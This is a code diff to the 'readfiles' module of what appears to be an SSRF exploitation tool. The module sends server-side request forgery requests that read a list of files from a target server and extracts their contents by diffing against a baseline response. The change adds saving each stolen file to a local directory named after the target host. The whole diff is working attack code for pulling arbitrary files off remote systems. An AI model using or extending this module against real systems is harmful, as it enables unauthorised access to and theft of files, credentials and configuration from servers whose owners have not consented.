@@ -1,5 +1,6 @@
 from core.utils import *
 import logging
+import os
 
 name          = "readfiles"
 description   = "Read files from the target"
@@ -16,10 +17,22 @@ class exploit():
         if r != None:
             default = r.text
 
+            # Create directory to store files
+            directory = requester.host
+            if not os.path.exists(directory):
+                os.makedirs(directory)
+
             for f in self.files:
                 r  = requester.do_request(args.param, wrapper_file(f))
-                logging.info("\033[32mReading file\033[0m : {}".format(f))
-
-                # Display diff between default and ssrf request
                 diff = diff_text(r.text, default)
-                print(diff)
+                if diff != "":
+
+                    # Display diff between default and ssrf request
+                    logging.info("\033[32mReading file\033[0m : {}".format(f))
+                    print(diff)
+
+                    # Write diff to a file
+                    filename = f.replace('\\','_').replace('/','_')
+                    logging.info("\033[32mWriting file\033[0m : {} to {}".format(f, directory + "/" + filename))
+                    with open(directory + "/" + filename, 'w') as f:
+                        f.write(diff)
